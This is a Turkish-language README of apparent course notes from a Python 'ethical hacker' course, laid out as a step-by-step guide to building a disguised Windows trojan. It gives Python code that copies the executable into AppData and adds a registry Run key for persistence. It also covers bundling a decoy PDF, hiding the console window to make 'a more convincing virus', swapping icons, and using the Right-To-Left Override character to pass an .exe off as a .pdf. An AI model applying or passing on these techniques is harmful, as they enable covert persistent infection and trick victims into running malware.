# ethical-hacker
Bu projede ,başlangıçta, Atıl Samancıoğlu'nun "Python: Sıfırdan İleri Seviyeye - Etik Hacker Örnekleriyle" kursunu takip ederek yadığım kodlar vardır. Bunları kendim geliştireceğim ve yeni scriptler ekleyeceğim.

### Exe'ye Çevirme İşlemi (in Windows)
`pip install pyinstaller`
pyinstaller.exe'nin konumunu buluyoruz (.../Scripts/pyinstaller.exe).
`...\pyinstaller.exe PythonFile.py --onefile`

### Bilgisayar Her Açıldığında Programımızı Çalıştırmayı Sağlama (in Windows)
`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v isim /t REG_SZ /d "C:\...\myexe.exe"`
Bu komut bir exe'yi her açılışta çalıştırmamıza yarıyor. Yapmamız gereken uygulamamızı gizli bir klasöre kopyalamak ve bu yeni dosyanın yolunu regedit'e eklemek. Kodda bunu yapmak için;
`
...

import subprocess
import os
import shutil
import sys

new_file = os.environ["appdata"] + "\\myexe.exe"
if not os.path.exists(new_file):
	shutil.copyfile(sys.executable,new_file)
	regedit_command = "Yukarıdaki regedit komutu (Sonundaki yolu new_file ile vereceğiz)"+new_file
	subprocess.call(regedit_command, shell=True)
...
`

### Dosyaya PDF Eklemek (in Windows)
Bunu paketleme sırasında yapıyoruz
`...\pyinstaller.exe PythonFile.py --onefile --add-data "...\dosya.pdf;."`	(;. ek olarak koymamız gerekiyor)
Bu tek başına yeterli değil. Aynı zamanda kodumuzun içinde exe'ye basıldığında bu dosyanın gösterilmesini sağlayacağız.
`
def open_added_file():
	added_file = sys._MEIPASS + "\\dosya.pdf"
	subprocess.Popen(added_file,shell=True)

...

open_added_file()
`
Ayrıca yukarıdaki komuta --noconsole eklersek terminal açılmasını engellemiş oluruz. Daha inandırıcı bir virüs yazmış oluruz. subprocess'in bir metodunda özel bir durum var, --noconsole yeterli olmuyor. Bu komut check_output. BU komutu yazarken de;
`degisken = subprocess.check_output("command",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)`

### İkon Değiştirmek (in Windows)
Yukarıdaki paketleme komutuna --icon "...\icon_dosyasi.ico" eklememiz yeterlidir.

### Uzantıyı Değiştirmek (in Kali Linux)
`apt-get install gnome-characters`
Leafpad'da uygulamamızın ismini yazıyoruz. MyVirus.exe gibi.
Sonrasında düzenleme yapıyoruz. Yazıyı MyVirusfdp.exe şeklinde düzenliyoruz.
Characters uygulamasını açıyoruz. right-to-left seçeneğini aratıyoruz ve Right To Left Override'ı seçiyoruz. Copy Character diyoruz.
Sonrasında imlecimizi fdp.exe'nin başına koyuyoruz ve Ctrl+V yapıyoruz. Yazının değiştiğini görmeiz gerekiyor (MyVirusexe.pdf şeklinde). Sonrasında bunu kopyalıyoruz ve dosyamızı isimlendiriyoruz.
